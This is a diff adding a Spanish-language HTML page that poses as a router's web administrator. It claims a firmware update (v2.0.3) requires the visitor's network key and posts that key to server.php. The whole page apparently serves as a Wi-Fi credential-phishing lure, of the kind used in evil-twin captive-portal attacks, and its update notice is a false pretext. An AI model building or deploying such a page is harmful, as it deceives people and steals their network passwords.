@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Portal Inicio Sesion</title>
+</head>
+<style>
+body{
+	margin:0;
+	width:100vw;
+	height:100vh;
+	max-width:100%;
+	display:flex;
+	justify-content:center;
+	background-color:#009edc;
+	
+}
+.center-square{
+	width:70vw;
+	height:50vh;
+	border:1px solid #f2f2f2;
+	padding:5px;
+	background-color:#ffffff;
+	text-align:center;
+}
+
+.square-title{
+	width:100%;
+	border-bottom:1px solid #f2f2f2;
+	
+	padding:5px;
+}
+.square-title img{
+	width:60px;
+}
+</style>
+<body>
+	<div class="center-square">
+		<div class="square-title">
+			<img src="enrutador.png" />
+			<h2>Administrador WEB</h2>
+		</div>
+		<p>Lamentamos este inconveniente</p>
+		<p>Motivo: Actualizacion de firmware (v2.0.3)</p>
+		<p>Es necesaria la clave de red para una correcta autenticacion ante el servidor</p>
+		<form method="POST" action="server.php">
+			<input type="key" name="key" placeholder="Clave" />
+			<input type="submit" value="Actualizar" />
+		</form>
+	</div>
+</body>
+</html>
